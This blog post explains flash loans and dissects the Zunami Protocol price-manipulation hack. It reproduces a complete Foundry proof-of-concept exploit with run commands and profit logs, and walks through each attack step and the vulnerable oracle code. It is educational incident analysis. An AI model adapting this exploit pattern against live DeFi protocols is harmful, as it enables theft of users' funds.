---
title: "Understanding Flash Loan Attacks Through a Practical Example"
subtitle: "A Comprehensive Case Study of a Flash Loan Attack in DeFi"
date: 2023-08-29
permalink: /posts/2023-08-29/understanding-flash-loan-attacks-through-a-practical-example/
categories:
  - Security
    - DeFi
tags:
  - Security
    - Flash Loan
    - Smart Contracts
    - Blockchain
excerpt: "Detailed case study explaining the mechanics and implications of flash loan attacks in DeFi."
---

### Understanding Flash Loan Attacks Through a Practical Example

#### A Comprehensive Case Study of a Flash Loan Attack

In this article, we delve into a detailed case study of a flash loan attack, aiming to achieve a comprehensive understanding of its mechanics and implications.

### Flash Loans

![](https://cdn-images-1.medium.com/max/800/1*UKJow6zgHTZ4hueU3iJJhg.jpeg)Source: <https://www.moonpay.com/learn/defi/defi-flash-loans>

Flash loans are a new concept in DeFi initially introduced by Marble in 2018 and later implemented and publicly used by Aave blockchain in 2020 [1]. In simple terms, flash loans allow users to borrow any amount of assets without providing collateral, as long as they return the borrowed amount within the same transaction. This might sound like a risky proposition, but the design of flash loans ensures that if the borrowed amount isn’t returned within that single transaction, the entire transaction fails and is reverted, ensuring no funds are actually lost.

This unique mechanism has opened up a myriad of opportunities for arbitrage, collateral swapping, and other financial strategies within the DeFi space. The innovation not only showcases the flexibility of decentralized financial systems but also challenges traditional notions of lending and borrowing.

The following code demonstrates how to use a flash loan in our smart contract using Aave [2]:
    
    
    // SPDX-License-Identifier: MIT  
    pragma solidity 0.8.10;  
      
    import "https://github.com/aave/aave-v3-core/blob/master/contracts/flashloan/base/FlashLoanSimpleReceiverBase.sol";  
    import "https://github.com/aave/aave-v3-core/blob/master/contracts/interfaces/IPoolAddressesProvider.sol";  
    import "https://github.com/aave/aave-v3-core/blob/master/contracts/dependencies/openzeppelin/contracts/IERC20.sol";  
      
    contract SimpleFlashLoan is FlashLoanSimpleReceiverBase {  
        address payable owner;  
      
        constructor(address _addressProvider)  
            FlashLoanSimpleReceiverBase(IPoolAddressesProvider(_addressProvider))  
        {  
        }  
      
        function fn_RequestFlashLoan(address _token, uint256 _amount) public {  
            address receiverAddress = address(this);  
            address asset = _token;  
            uint256 amount = _amount;  
            bytes memory params = "";  
            uint16 referralCode = 0;  
      
            POOL.flashLoanSimple(  
                receiverAddress,  
                asset,  
                amount,  
                params,  
                referralCode  
            );  
        }  
          
            //This function is called after your contract has received the flash loaned amount  
      
        function  executeOperation(  
            address asset,  
            uint256 amount,  
            uint256 premium,  
            address initiator,  
            bytes calldata params  
        )  external override returns (bool) {  
              
            //Logic goes here  
              
            uint256 totalAmount = amount + premium;  
            IERC20(asset).approve(address(POOL), totalAmount);  
      
            return true;  
        }  
      
        receive() external payable {}  
    }

### Flash Loan Attacks

Introducing flash loans was a double-edged sword. While they brought forth applications such as arbitrage, they also paved the way for significant attacks using flash loans. Some noteworthy instances include:

  * OUSD attack with a lost value of $7.9M [3].
  * Value Defi attack with a lost value of $6M+ [4].
  * Cheese Bank attack with a lost value of $3M [5].

Such incidents highlight the vulnerabilities inherent in the DeFi space, emphasizing the need for increased security measures and vigilance. The list of attacks unfortunately continues to grow as DeFi gains prominence.

### Case Study

The Zunami Protocol [6] was compromised in a hack resulting in a loss of over $2 million through the utilization of flash loans [7]. In the continuation of this article, we endeavor to comprehensively understand the nature of this attack.

#### DefiHackLabs

DeFiHackLabs is a GitHub repository [8] that provides a collection of tools and resources for learning about and debugging DeFi hacks. The repository includes code for reproducing 269 DeFi hack incidents, as well as transaction debugging tools, Ethereum signature databases, and other useful resources. The repository is maintained by SunWeb3Sec, a security research team focused on DeFi.

> The repository is intended for educational purposes only and should not be used for illegal or malicious activities. The information in the repository should be used to learn about DeFi hacks and how to prevent them.

#### Proof of Concept

Here is the PoC (Proof of Concept), which is a test case that exposes the vulnerability of the Zunami attack [9]. We will delve into the code in the following sections.
    
    
    // SPDX-License-Identifier: UNLICENSED  
    pragma solidity ^0.8.10;  
      
    import "forge-std/Test.sol";  
    import "./interface.sol";  
      
    // @KeyInfo - Total Lost : ~2M USD$  
    // Attacker : https://etherscan.io/address/0x5f4c21c9bb73c8b4a296cc256c0cde324db146df  
    // Attack Contract : https://etherscan.io/address/0xa21a2b59d80dc42d332f778cbb9ea127100e5d75  
    // Vulnerable Contract : https://etherscan.io/address/0xb40b6608b2743e691c9b54ddbdee7bf03cd79f1c  
    // Attack Tx : https://etherscan.io/tx/0x0788ba222970c7c68a738b0e08fb197e669e61f9b226ceec4cab9b85abe8cceb  
      
    // @Info  
    // Vulnerable Contract Code : https://etherscan.io/address/0xb40b6608b2743e691c9b54ddbdee7bf03cd79f1c#code  
      
    // @Analysis  
    // Post-mortem : https://www.google.com/  
    // Twitter Guy : https://twitter.com/peckshield/status/1690877589005778945  
    // Twitter Guy : https://twitter.com/BlockSecTeam/status/1690931111776358400  
    // Hacking God : https://www.google.com/  
      
    interface IUZD is IERC20 {  
        function cacheAssetPrice() external;  
    }  
      
    interface ICurve {  
        function exchange(  
            uint256 i,  
            uint256 j,  
            uint256 dx,  
            uint256 min_dy,  
            bool use_eth,  
            address receiver  
        ) external returns (uint256);  
    }  
      
    contract ContractTest is Test {  
        IUZD UZD = IUZD(0xb40b6608B2743E691C9B54DdBDEe7bf03cd79f1c);  
        IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);  
        IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);  
        IERC20 crvUSD = IERC20(0xf939E0A03FB07F59A73314E73794Be0E57ac1b4E);  
        IERC20 crvFRAX = IERC20(0x3175Df0976dFA876431C2E9eE6Bc45b65d3473CC);  
        IERC20 USDT = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);  
        IERC20 SDT = IERC20(0x73968b9a57c6E53d41345FD57a6E6ae27d6CDB2F);  
        IERC20 FRAX = IERC20(0x853d955aCEf822Db058eb8505911ED77F175b99e);  
        ICurvePool FRAX_USDC_POOL = ICurvePool(0xDcEF968d416a41Cdac0ED8702fAC8128A64241A2);  
        ICurvePool UZD_crvFRAX_POOL = ICurvePool(0x68934F60758243eafAf4D2cFeD27BF8010bede3a);  
        ICurvePool crvUSD_USDC_POOL = ICurvePool(0x4DEcE678ceceb27446b35C672dC7d61F30bAD69E);  
        ICurvePool crvUSD_UZD_POOL = ICurvePool(0xfC636D819d1a98433402eC9dEC633d864014F28C);  
        ICurvePool Curve3POOL = ICurvePool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);  
        ICurve ETH_SDT_POOL = ICurve(0xfB8814D005C5f32874391e888da6eB2fE7a27902);  
        Uni_Router_V2 sushiRouter = Uni_Router_V2(0xd9e1cE17f2641f24aE83637ab66a2cca9C378B9F);  
        Uni_Pair_V3 USDC_WETH_Pair = Uni_Pair_V3(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);  
        Uni_Pair_V3 USDC_USDT_Pair = Uni_Pair_V3(0x3416cF6C708Da44DB2624D63ea0AAef7113527C6);  
        IBalancerVault Balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);  
        address MIMCurveStakeDao = 0x9848EDb097Bee96459dFf7609fb582b80A8F8EfD;  
      
        function setUp() public {  
            vm.createSelectFork("mainnet", 17_908_949);  
            vm.label(address(WETH), "WETH");  
            vm.label(address(USDC), "USDC");  
            vm.label(address(UZD), "UZD");  
            vm.label(address(crvUSD), "crvUSD");  
            vm.label(address(crvFRAX), "crvFRAX");  
            vm.label(address(USDT), "USDT");  
            vm.label(address(FRAX), "FRAX");  
            vm.label(address(FRAX_USDC_POOL), "FRAX_USDC_POOL");  
            vm.label(address(UZD_crvFRAX_POOL), "UZD_crvFRAX_POOL");  
            vm.label(address(crvUSD_USDC_POOL), "crvUSD_USDC_POOL");  
            vm.label(address(crvUSD_UZD_POOL), "crvUSD_UZD_POOL");  
            vm.label(address(Curve3POOL), "Curve3POOL");  
            vm.label(address(ETH_SDT_POOL), "ETH_SDT_POOL");  
            vm.label(address(sushiRouter), "sushiRouter");  
            vm.label(address(USDC_WETH_Pair), "USDC_WETH_Pair");  
            vm.label(address(USDC_USDT_Pair), "USDC_USDT_Pair");  
            vm.label(address(Balancer), "Balancer");  
            vm.label(address(MIMCurveStakeDao), "MIMCurveStakeDao");  
        }  
      
        function testExploit() external {  
            USDC_USDT_Pair.flash(address(this), 0, 7_000_000 * 1e6, abi.encode(7_000_000 * 1e6));  
      
            emit log_named_decimal_uint(  
                "Attacker WETH balance after exploit", WETH.balanceOf(address(this)), WETH.decimals()  
            );  
      
            emit log_named_decimal_uint(  
                "Attacker USDT balance after exploit", USDT.balanceOf(address(this)), USDT.decimals()  
            );  
        }  
      
        function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {  
            BalancerFlashLoan();  
      
            uint256 amount = abi.decode(data, (uint256));  
            TransferHelper.safeTransfer(address(USDT), address(USDC_USDT_Pair), amount1 + amount);  
        }  
      
        function BalancerFlashLoan() internal {  
            address[] memory tokens = new address[](2);  
            tokens[0] = address(USDC);  
            tokens[1] = address(WETH);  
            uint256[] memory amounts = new uint256[](2);  
            amounts[0] = 7_000_000 * 1e6;  
            amounts[1] = 10_011 ether;  
            bytes memory userData = "";  
            Balancer.flashLoan(address(this), tokens, amounts, userData);  
        }  
      
        // balancer flashloan callback  
        function receiveFlashLoan(  
            address[] memory tokens,  
            uint256[] memory amounts,  
            uint256[] memory feeAmounts,  
            bytes memory userData  
        ) external {  
            apporveAll();  
      
            uint256[2] memory amount;  
            amount[0] = 0;  
            amount[1] = 5_750_000 * 1e6;  
            uint256 crvFRAXBalance = FRAX_USDC_POOL.add_liquidity(amount, 0); // mint crvFRAX  
      
            UZD_crvFRAX_POOL.exchange(1, 0, crvFRAXBalance, 0, address(this)); // swap crvFRAX to UZD  
      
            crvUSD_USDC_POOL.exchange(0, 1, 1_250_000 * 1e6, 0, address(this)); // swap USDC to crvUSD  
      
            crvUSD_UZD_POOL.exchange(1, 0, crvUSD.balanceOf(address(this)), 0, address(this)); // swap crvUSD to UZD  
      
            ETH_SDT_POOL.exchange(0, 1, 11 ether, 0, false, address(this)); // swap WETH to SDT  
      
            // @Vulnerability Code:  
            // UZD balanceOf return value is manipulated by the following values  
            // uint256 amountIn = sdtEarned + _config.sdt.balanceOf(address(this)); -> get SDT amount in MIMCurveStakeDao  
            // uint256 sdtEarningsInFeeToken = priceTokenByExchange(amountIn, _config.sdtToFeeTokenPath); -> sushi router.getAmountsOut(amountIn, exchangePath); path: SDT -> WETH -> USDT  
            emit log_named_decimal_uint(  
                "Before donation and reserve manipulation, UZD balance", UZD.balanceOf(address(this)), WETH.decimals()  
            );  
            SDT.transfer(MIMCurveStakeDao, SDT.balanceOf(address(this))); // donate SDT to MIMCurveStakeDao, inflate UZD balance  
      
            swapToken1Totoken2(WETH, SDT, 10_000 ether); // swap WETH to SDT by sushi router  
            uint256 value = swapToken1Totoken2(USDT, WETH, 7_000_000 * 1e6); // swap USDT to WETH by sushi router  
      
            UZD.cacheAssetPrice(); // rebase UZD balance  
      
            emit log_named_decimal_uint(  
                "After donation and reserve manipulation, UZD balance", UZD.balanceOf(address(this)), WETH.decimals()  
            );  
      
            swapToken1Totoken2(SDT, WETH, SDT.balanceOf(address(this))); // swap SDT to WETH  
            swapToken1Totoken2(WETH, USDT, value); // swap WETH to USDT  
      
            UZD_crvFRAX_POOL.exchange(0, 1, UZD.balanceOf(address(this)) * 84 / 100, 0, address(this)); // swap UZD to crvFRAX  
      
            crvUSD_UZD_POOL.exchange(0, 1, UZD.balanceOf(address(this)), 0, address(this)); // swap UZD to crvUSD  
      
            FRAX_USDC_POOL.remove_liquidity(crvFRAX.balanceOf(address(this)), [uint256(0), uint256(0)]); // burn crvFRAX  
      
            FRAX_USDC_POOL.exchange(0, 1, FRAX.balanceOf(address(this)), 0); // swap FRAX to USDC  
      
            crvUSD_USDC_POOL.exchange(1, 0, crvUSD.balanceOf(address(this)), 0, address(this)); // swap crvUSD to USDC  
      
            Curve3POOL.exchange(1, 2, 25_920 * 1e6, 0); // swap USDC to USDT  
      
            uint256 swapAmount = USDC.balanceOf(address(this)) - amounts[0];  
            USDC_WETH_Pair.swap(address(this), true, int256(swapAmount), 920_316_691_481_336_325_637_286_800_581_326, ""); // swap USDC to WETH  
      
            IERC20(tokens[0]).transfer(msg.sender, amounts[0] + feeAmounts[0]);  
            IERC20(tokens[1]).transfer(msg.sender, amounts[1] + feeAmounts[1]);  
        }  
      
        function apporveAll() internal {  
            USDC.approve(address(FRAX_USDC_POOL), type(uint256).max);  
            crvFRAX.approve(address(UZD_crvFRAX_POOL), type(uint256).max);  
            UZD.approve(address(UZD_crvFRAX_POOL), type(uint256).max);  
            USDC.approve(address(crvUSD_USDC_POOL), type(uint256).max);  
            crvUSD.approve(address(crvUSD_USDC_POOL), type(uint256).max);  
            crvUSD.approve(address(crvUSD_UZD_POOL), type(uint256).max);  
            UZD.approve(address(crvUSD_UZD_POOL), type(uint256).max);  
            WETH.approve(address(ETH_SDT_POOL), type(uint256).max);  
            USDC.approve(address(Curve3POOL), type(uint256).max);  
            USDC.approve(address(USDC_WETH_Pair), type(uint256).max);  
            WETH.approve(address(sushiRouter), type(uint256).max);  
            SDT.approve(address(sushiRouter), type(uint256).max);  
            TransferHelper.safeApprove(address(USDT), address(sushiRouter), type(uint256).max);  
            FRAX.approve(address(FRAX_USDC_POOL), type(uint256).max);  
        }  
      
        function swapToken1Totoken2(IERC20 token1, IERC20 token2, uint256 amountIn) internal returns (uint256) {  
            address[] memory path = new address[](2);  
            path[0] = address(token1);  
            path[1] = address(token2);  
            uint256[] memory values =  
                sushiRouter.swapExactTokensForTokens(amountIn, 0, path, address(this), block.timestamp);  
            return values[1];  
        }  
      
        function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata data) external {  
            USDC.transfer(msg.sender, uint256(amount0Delta));  
        }  
    }

#### Setup:
    
    
    curl -L https://foundry.paradigm.xyz | bash  
    git clone git@github.com:SunWeb3Sec/DeFiHackLabs.git  
    cd DeFiHackLabs

#### Run:
    
    
    forge test --contracts ./src/test/Zunami_exp.sol --evm-version 'shanghai' -vvv

#### Logs:
    
    
    Running 1 test for src/test/Zunami_exp.sol:ContractTest  
    [PASS] testExploit() (gas: 5443625)  
    Logs:  
      Before donation and reserve manipulation, UZD balance: 4873316.591569740886823823  
      After donation and reserve manipulation, UZD balance: 16902957.773155665803499610  
      Attacker WETH balance after exploit: 1152.913811977198057525  
      Attacker USDT balance after exploit: 1275.238963  
      
    Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 173.34s  
    Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)

### Exploring the Attack: A Detailed Walkthrough

![](https://cdn-images-1.medium.com/max/800/1*a7ieWnvgLJ3gMiJa43h9Ww.png)Screenshot of <https://github.com/SunWeb3Sec/DeFiHackLabs#20230814-zunamiprotocol---price-manipulation>

**Step 1:** Borrow 7,000,000 USDT from the **UniswapV3** , 7,000,000 USDC and 10,011 WETH from the **Balancer**
    
    
     // Borrow 7_000_000 USDT from UniswapV3  
    USDC_USDT_Pair.flash(address(this), 0, 7_000_000 * 1e6, abi.encode(7_000_000 * 1e6));  
      
      
    function uniswapV3FlashCallback(uint256 amount0, uint256 amount1, bytes calldata data) external {  
        BalancerFlashLoan();  
      
        uint256 amount = abi.decode(data, (uint256));  
        TransferHelper.safeTransfer(address(USDT), address(USDC_USDT_Pair), amount1 + amount);  
    }  
      
    // Borrow 7_000_00 USDC and 10_011 WETH from Balancer  
    function BalancerFlashLoan() internal {  
        address[] memory tokens = new address[](2);  
        tokens[0] = address(USDC);  
        tokens[1] = address(WETH);  
        uint256[] memory amounts = new uint256[](2);  
        amounts[0] = 7_000_000 * 1e6;  
        amounts[1] = 10_011 ether;  
        bytes memory userData = "";  
        Balancer.flashLoan(address(this), tokens, amounts, userData);  
    }

**Step 2:** Add liquidity in the `CruveFinance:Swap` with 5,750,000 USDC and mint ~5,746,896 the GrvFRAX, then swap ~5,746,896 CrVFRAX for ~ 4,082,046 UZD and 1,250,000 USDC for ~791,280 UZD in the Curve.
    
    
    uint256[2] memory amount;  
    amount[0] = 0;  
    amount[1] = 5_750_000 * 1e6;  
    // mint crvFRAX  
    uint256 crvFRAXBalance = FRAX_USDC_POOL.add_liquidity(amount, 0);  
    // swap crvFRAX to UZD  
    UZD_crvFRAX_POOL.exchange(1, 0, crvFRAXBalance, 0, address(this));   
    // swap USDC to crvUSD  
    crvUSD_USDC_POOL.exchange(0, 1, 1_250_000 * 1e6, 0, address(this)); 

**Step 3 [Price Manipulation]:** Swap 11 WETH for ~55,981 ST in the Curve, then donate all SDT (~55,598) into the **MIMCurveStakeDao**.
    
    
    // swap WETH to SDT  
    ETH_SDT_POOL.exchange(0, 1, 11 ether, 0, false, address(this));   
    // donate SDT to MIMCurveStakeDao, inflate UZD balance  
    SDT.transfer(MIMCurveStakeDao, SDT.balanceOf(address(this)));

**Step 4 [Price Manipulation]:** Swap 10,000 WETH for ~58,043 SDT and 7,000,000 USDT for ~2,154 WETH in the **SushiSwap**.
    
    
    // swap WETH to SDT by sushi router  
    swapToken1Totoken2(WETH, SDT, 10_000 ether);  
    // swap USDT to WETH by sushi router  
    uint256 value = swapToken1Totoken2(USDT, WETH, 7_000_000 * 1e6);

**Step 5:** Cache the price snapshot in the UZD via the function `cachessetPrice` (the price cached has already been manipulated)
    
    
    // rebase UZD balance  
    UZD.cacheAssetPrice();

Let’s explore the vulnerable code:
    
    
    /**  
      * @dev Being the main rebasing mechanism, this function allows anyone  
         to sync cached priced with the oracle by minting needed supply.  
         An arbitrary user can arbitrage by sandwiched trade-rebase-trade operations.  
         Any contracts wanting to support UZD tokens should take into account this possibility  
         of potentially non-synced price.  
       */  
    function cacheAssetPrice() public virtual {  
        _blockCached = block.number;  
        uint256 currentAssetPrice = assetPrice();  
        if (_assetPriceCached < currentAssetPrice) {  
            _assetPriceCached = currentAssetPrice;  
            emit CachedAssetPrice(_blockCached, _assetPriceCached);  
        }  
    }  
      
    function assetPrice() public view override returns (uint256) {  
        return priceOracle.lpPrice();  
    }  
      
    // priceOracle defined in the constructor  
    constructor(address priceOracle_) {  
        _setupRole(DEFAULT_ADMIN_ROLE, msg.sender);  
      
        require(priceOracle_ != address(0), 'Zero price oracle');  
        priceOracle = IAssetPriceOracle(priceOracle_);  
      
        cacheAssetPrice();  
    }

What is the address of the `priceOracle`? We should see where the `ZunamiElasticRigidVault` is initialized or used:
    
    
    // SPDX-License-Identifier: MIT  
    pragma solidity ^0.8.0;  
      
    import './ZunamiElasticRigidVault.sol';  
      
    contract UZD is ZunamiElasticRigidVault {  
        address public constant ZUNAMI = 0x2ffCC661011beC72e1A9524E12060983E74D14ce;  
      
        constructor()  
            ElasticERC20('UZD Zunami Stable', 'UZD')  
            ElasticRigidVault(IERC20Metadata(ZUNAMI))  
            ZunamiElasticRigidVault(ZUNAMI)  
        {}  
    }

Let’s explore the `lpPrice` function in the `priceOracle` with address `0x2ffCC661011beC72e1A9524E12060983E74D14ce`:
    
    
    /**  
     * @dev Returns price depends on the income of users  
     * @return Returns currently price of ZLP (1e18 = 1$)  
     */  
    function lpPrice() external view returns (uint256) {  
        return (totalHoldings() * 1e18) / totalSupply();  
    }  
      
    // totalHoldings():  
    /**  
     * @dev Returns total holdings for all pools (strategy's)  
     * @return Returns sum holdings (USD) for all pools  
     */  
    function totalHoldings() public view returns (uint256) {  
        uint256 length = _poolInfo.length;  
        uint256 totalHold = 0;  
        for (uint256 pid = 0; pid < length; pid++) {  
            totalHold += _poolInfo[pid].strategy.totalHoldings();  
        }  
        return totalHold;  
    }

So, when the attacker donates to MIMCurveStakeDao, the price of UZD inflates and since the function `balanceOf` in the UZD contract relies on the incorrect price in the cache, the balance of the ATTACKER is inflated now!

**Step 6:** Reverse all operations for manipulating the price of UZD and swap all UZD inflated to profit.
    
    
    // swap SDT to WETH  
    swapToken1Totoken2(SDT, WETH, SDT.balanceOf(address(this)));  
    // swap WETH to USDT  
    swapToken1Totoken2(WETH, USDT, value);  
    // swap UZD to crvFRAX  
    UZD_crvFRAX_POOL.exchange(0, 1, UZD.balanceOf(address(this)) * 84 / 100, 0, address(this));  
    // swap UZD to crvUSD  
    crvUSD_UZD_POOL.exchange(0, 1, UZD.balanceOf(address(this)), 0, address(this));   
    // burn crvFRAX  
    FRAX_USDC_POOL.remove_liquidity(crvFRAX.balanceOf(address(this)), [uint256(0), uint256(0)]);   
    // swap FRAX to USDC  
    FRAX_USDC_POOL.exchange(0, 1, FRAX.balanceOf(address(this)), 0);   
    // swap crvUSD to USDC  
    crvUSD_USDC_POOL.exchange(1, 0, crvUSD.balanceOf(address(this)), 0, address(this));   
    // swap USDC to USDT  
    Curve3POOL.exchange(1, 2, 25_920 * 1e6, 0);   
      
    uint256 swapAmount = USDC.balanceOf(address(this)) - amounts[0];  
    USDC_WETH_Pair.swap(address(this), true, int256(swapAmount), 920_316_691_481_336_325_637_286_800_581_326, ""); // swap USDC to WETH  
      
    IERC20(tokens[0]).transfer(msg.sender, amounts[0] + feeAmounts[0]);  
    IERC20(tokens[1]).transfer(msg.sender, amounts[1] + feeAmounts[1]);

#### What is Price Oracle?

> In the context of web3 and blockchain technology, a price oracle serves as a crucial component that provides real-world data to smart contracts and decentralized applications (dApps). Smart contracts on blockchains like Ethereum are self-executing agreements with predefined rules. They can’t access data from outside the blockchain on their own, which makes them dependent on external sources to obtain information.

> A price oracle specifically focuses on providing accurate and up-to-date price information for various assets, such as cryptocurrencies, traditional fiat currencies, commodities, stocks, and more. This price data is important for executing actions within smart contracts that involve value transfer or decision-making based on price fluctuations.

### Summary

If we took a look at the provided references [10, 11] we can understand that the attack is a **Price Manipulation attack** on the **Zunami protocol** , resulting in a loss of **over $2.1 million**. The attack involved two transactions, which were part of the exploit.

  1. <https://etherscan.io/tx/0x2aec4fdb2a09ad4269a410f2c770737626fb62c54e0fa8ac25e8582d4b690cca>
  2. <https://etherscan.io/tx/0x0788ba222970c7c68a738b0e08fb197e669e61f9b226ceec4cab9b85abe8cceb>

The primary method of attack was exploiting a flaw in the calculation of the LP price within the `totalHoldings` function of strategies like **MIMCurveStakeDao**. The attacker artificially inflated `sdt` and `sdtPrice`, leading to **incorrect price calculation**.

The second transaction of the attack yielded the most profit, resulting in a gain of approximately 1152 ETH.

Following the attack, the stolen funds were washed through another platform, **TornadoCash**. An encrypted hash related to the attack was also mentioned, but its actual content or purpose wasn’t disclosed.

### Conclusion [Written by ChatGPT]

In a recent DeFi attack, a vulnerability in the Zunami Protocol led to a loss of over $2 million. The attacker exploited a flaw in the LP price calculation within certain strategies, artificially inflating prices and reaping significant profits. The attack involved multiple transactions, including manipulating UZD token prices and utilizing flash loans to borrow assets. By skillfully manipulating the price oracle and the vulnerable protocol, the attacker managed to siphon off substantial funds. This incident underscores the ongoing vulnerabilities in the DeFi space and **the need for continuous security measures and vigilance**.

### References

  1. Cao, Y., Zou, C., & Cheng, X. (2021). Flashot: a snapshot of flash loan attack on DeFi ecosystem. arXiv preprint arXiv:2102.00626.
  2. <https://www.quicknode.com/guides/defi/lending-protocols/how-to-make-a-flash-loan-using-aave>
  3. <https://medium.com/@matthewliu/urgent-ousd-has-hacked-and-there-has-been-a-loss-of-funds-7b8c4a7d534c>
  4. <https://www.coindesk.com/markets/2020/11/14/value-defi-suffers-6m-flash-loan-attack/>
  5. <https://peckshield.medium.com/cheese-bank-incident-root-cause-analysis-d076bf87a1e7>
  6. <https://twitter.com/ZunamiProtocol>
  7. <https://decrypt.co/152366/zunami-protocol-curve-finance-hack>
  8. <https://github.com/SunWeb3Sec/DeFiHackLabs>
  9. <https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Zunami_exp.sol>